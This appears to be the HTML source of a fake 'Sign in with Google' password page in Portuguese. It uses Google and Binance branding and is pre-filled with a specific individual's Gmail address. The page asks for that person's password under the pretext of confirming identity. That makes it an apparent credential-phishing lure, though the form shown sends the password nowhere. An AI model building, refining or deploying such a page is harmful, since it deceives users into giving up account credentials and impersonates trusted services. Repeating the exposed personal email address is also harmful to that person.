<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer Login com o Google</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="google-logo">
                <svg viewBox="0 0 24 24" width="24" height="24">
                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
            </div>
            <span class="header-text">Fazer Login com o Google</span>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <!-- Left Panel -->
            <div class="left-panel">
                <div class="binance-logo">
                    <svg viewBox="0 0 126.61 126.61" width="80" height="80">
                        <g fill="#F3BA2F">
                            <path d="M38.73 53.2l24.59-24.58 24.6 24.6 14.3-14.31L63.32 0 24.42 38.9l14.31 14.3z"/>
                            <path d="M0 63.31l14.3-14.3 14.31 14.3-14.3 14.3z"/>
                            <path d="M38.73 73.41l24.59 24.59 24.6-24.6 14.31 14.29-38.9 38.91-38.91-38.88 14.31-14.31z"/>
                            <path d="M98 63.31l14.3-14.3 14.31 14.3-14.3 14.3z"/>
                            <path d="M77.83 63.3L63.32 48.78 52.59 59.51l-1.24 1.23-2.54 2.54 14.51 14.5 14.51-14.47z"/>
                        </g>
                    </svg>
                </div>
                
                <h1 class="greeting">Olá!</h1>
                
                <div class="user-info">
                    <div class="user-icon">
                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#fff">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                        </svg>
                    </div>
                    <span class="user-email">davidxavierbrito@gmail.com</span>
                </div>
            </div>

            <!-- Right Panel -->
            <div class="right-panel">
                <h2 class="confirmation-text">Para continuar, primeiro confirme sua identidade</h2>
                
                <form class="login-form">
                    <div class="input-group">
                        <input 
                            type="password" 
                            id="password" 
                            class="password-input" 
                            placeholder="Digite sua senha"
                            required
                        >
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="show-password" class="checkbox">
                        <label for="show-password" class="checkbox-label">Mostrar senha</label>
                    </div>
                    
                    <p class="privacy-text">
                        Consulte a <a href="#" class="link">Política de Privacidade</a> e os 
                        <a href="#" class="link">Termos de Serviço</a> do app binance.com antes de usá-lo.
                    </p>
                    
                    <div class="button-group">
                        <button type="button" class="btn-secondary">Tentar de outro jeito</button>
                        <button type="submit" class="btn-primary">Avançar</button>
                    </div>
                </form>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <div class="language-selector">
                <select id="language" class="language-dropdown">
                    <option value="pt-BR">Português (Brasil)</option>
                    <option value="en">English</option>
                    <option value="es">Español</option>
                </select>
            </div>
            
            <div class="footer-links">
                <a href="#" class="footer-link">Ajuda</a>
                <a href="#" class="footer-link">Privacidade</a>
                <a href="#" class="footer-link">Termos</a>
            </div>
        </footer>
    </div>

    <script>
        // Toggle password visibility
        const showPasswordCheckbox = document.getElementById('show-password');
        const passwordInput = document.getElementById('password');
        
        showPasswordCheckbox.addEventListener('change', function() {
            passwordInput.type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
